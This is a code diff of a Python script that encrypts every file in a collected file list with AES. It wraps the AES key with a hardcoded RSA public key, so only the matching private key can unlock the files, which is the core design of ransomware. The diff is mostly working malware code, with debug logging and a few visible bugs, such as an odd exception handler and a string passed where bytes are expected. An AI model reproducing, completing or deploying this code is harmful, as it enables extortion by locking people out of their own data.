@@ -1,21 +1,51 @@
+import base64
 import os
-
+import sys
 import hashlib
 import secrets
 import socket
 
+#AES encryption
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
+#RSA encryption
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
 
+#-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Some global variables
 DEBUG = True
+USEALWAYSDEFAULTPUBLICPEM = False
+NONCENSIZE=16
+
+public_pem="""-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx4pFJ9974tG7I0cEjcyo
+2tEK8Y+hc3k8rO2z2vlQ76JcTzUACDZ0dFlcNEvVxckT/CrDa4lDmECPF5xF3ykV
+Chkwvj5ZodXAzCV0jrtaGpb7s5sDpXWy6j6kUQeeNo4ObPs3k1RJ+b17SayqSxvR
+ZUUimqKZ0JU24v74YLQ3IvBiduqSQwKOsd5Igt1ToLlkSj8bcR1Jl5+qcfTfcxoA
+wbrmPk4cGn95LkcYumkLiZgxi+36d6Lw2pG+kjZqi6OCp22s1U7qugC9TnXt4ndQ
+K9H0vcCzTuKlMVqXx57zqGmLHX3h5Y77uOw+Qfn4M5oEjoLchksiYv0Y7JexPwmZ
+YwIDAQAB
+-----END PUBLIC KEY-----
+"""
+
+VERIFICATIONFILE = "verification"
+VERIFICATIONTEXT = "The password is correct"
+HASHFILE = "hash"
+LOGFILE = "log"
+
+#-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Methods 
 
 '''
 To create info logs
 '''
 def logInfo(text):
     if DEBUG:
-        print(text)
+        open(LOGFILE,"a").write("INFO    "+text+"\n")
+        #print(text)
 
 
 '''
@@ -23,7 +53,8 @@ To create error logs
 '''
 def logError(text):
     if DEBUG:
-        print("ERROR "+text)
+        open(LOGFILE,"a").write("ERROR   "+text+"\n")
+        #print("ERROR "+text)
 
 
 '''
@@ -57,8 +88,131 @@ def create_noncen(size):
     return noncen[:size]
 
 
+
 '''
-Mehtod to crypt with the aes algorithm
+Method that creates a file to verified the decryption key
+'''
+def createVerificationFile(key):
+    text = crypt_aes(key, create_noncen(NONCENSIZE), VERIFICATIONTEXT.encode())
+
+    with open(VERIFICATIONFILE, 'wb') as verification:
+        verification.write(text)
+        
+    
+'''
+Decrypts a file to verified the key is correct
+'''
+def vertificateFile(key):
+    verified = True
+    logInfo("verificando")
+    try:
+        verification = open(VERIFICATIONFILE, "rb").read()
+        verification = crypt_aes(key, create_noncen(NONCENSIZE), verification)
+        verification = verification.decode("utf-8")
+        logInfo("Verification text: "+str(verification))
+        if verification != VERIFICATIONTEXT:
+            verified = False
+    except ZeroDivisionError:
+        verified = False
+    return verified
+
+
+'''
+Method to load the AES hash and decrypt it
+'''
+def loadHash():
+    #We can receive the private key in the argument or in a input
+    myprivate = ""
+    if len(sys.argv) == 2:
+        myprivate = sys.argv[1]
+    else:
+        myprivate = input("The file where you have the private key: ")
+
+    #Open file
+    myprivate = open(myprivate).read()
+
+    #Create the private key object
+    logInfo("Private key: "+myprivate)
+    myprivate = myprivate.encode()
+    private_key = serialization.load_pem_private_key(
+        myprivate,
+        password=None,
+        backend=default_backend()
+    )
+
+    #Extract the encrypted hash
+    encryptedHash = open(HASHFILE, "r").read()
+
+    #Decrypt the hash
+    hash = private_key.decrypt(
+    base64.b64decode(encryptedHash),
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )    
+    )
+    
+    return hash
+
+
+
+'''
+Method to save the AES hash in a file, but before that we cipher the file with rsa
+'''
+def saveHash(hash):
+    #If there is an argument the argument is the key
+    mypublic = ""
+    if len(sys.argv) == 2:
+        mypublic = sys.argv[1]
+        try:
+            mypublic = open(mypublic,"r").read()
+            print(mypublic)
+        except:
+            logError("The file in the argument can't be read")
+    
+    #Cases in where we are going to use the default key
+    if USEALWAYSDEFAULTPUBLICPEM or len(mypublic)!=len(public_pem):
+        mypublic = public_pem
+        
+    logInfo("RSA public key: "+mypublic)
+    mypublic = mypublic.encode()
+    
+    #Create the public key object
+    try:
+        public_key = serialization.load_pem_public_key(
+            mypublic,
+            backend=default_backend()
+        )
+    except:
+        logError("There has been a problem with the RSA key, we are going to use the default one")
+        #If the key has a problem we use the default key
+        public_pem.encode()
+        public_key = serialization.load_pem_public_key(
+            public_pem,
+            backend=default_backend()
+        )
+    
+    #Ecnrypt the hash password for the AES encryption
+    logInfo("Hash decrypted: "+str(hash.decode()))
+    encrypted = base64.b64encode(public_key.encrypt(
+        hash,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        ))
+    )
+    logInfo("Hash encrypted: "+str(encrypted.decode()))
+
+    #Save the hash in a file
+    hash = open(HASHFILE, "wb")
+    hash.write(encrypted)
+    hash.close()
+
+
+'''
+Method to crypt with the aes algorithm
 
 Key -> the hash password
 Nonce -> a noncen pseudorandom with a seed for each host
@@ -68,7 +222,6 @@ def crypt_aes(key, nonce, plaintext):
     cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=default_backend())
     encryptor = cipher.encryptor()
     ciphertext = encryptor.update(plaintext) + encryptor.finalize()
-    print(ciphertext)
     return ciphertext
 
 
@@ -145,12 +298,13 @@ def files():
 
     logInfo("All the files: "+str(", ".join(list_files)))
 
-    #Write in a file the list of files
-    try:
-        open("list_files","w+").write("\n".join(list_files))
-    except TypeError:
-        raise RuntimeError("There are no files")
-    
+    if DEBUG:
+        #Write in a file the list of files
+        try:
+            open("list_files","w+").write("\n".join(list_files))
+        except TypeError:
+            raise RuntimeError("There are no files")
+        
     return list_files
 
 '''
@@ -161,26 +315,25 @@ def execute():
     list_files = files()
     logInfo("List of files: "+", ".join(list_files))
 
-    if os.path.exists("hash"):
+    if os.path.exists(HASHFILE):
         #Decrypt the files
         logInfo("We are going to decrypt")
 
         #Read the hash in the file
-        hash = open("hash", "r")
-        key = "".join(hash.read().split("\n"))
-
-        #User enter a key
-        if key == input("Enter key: "):
+        key = loadHash()
+        
+        #Verify the hash
+        if vertificateFile(key):
             #If the key is correct all the files are decrypted
             logInfo("key "+str(key))
-            key = key.encode("utf-8")
 
             #Call the crypt method for everyfile
             for file in list_files:
                 crypt(key,file,16)
 
-            #Remove the hash file
-            os.remove("hash")
+            #Remove the hash and verification files
+            os.remove(HASHFILE)
+            os.remove(VERIFICATIONFILE)
 
         else:
             #The key is incorrect
@@ -196,17 +349,22 @@ def execute():
         key = key.encode("utf-8")
 
 
-        #Save key in a document
-        hash = open("hash", "wb")
-        hash.write(key)
-        hash.close()
+        #Save key with rsa encryption
+        saveHash(key)
+
+        #Create a verification file
+        createVerificationFile(key)
 
         #Call the crypt method for everyfile
         for file in list_files:
             crypt(key,file,16)
 
+#-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Execution
 
 try:
+    if DEBUG:
+        open(LOGFILE,"w").write("")
     execute()
 except KeyboardInterrupt:
     logError("KeyBoardInterrupt")
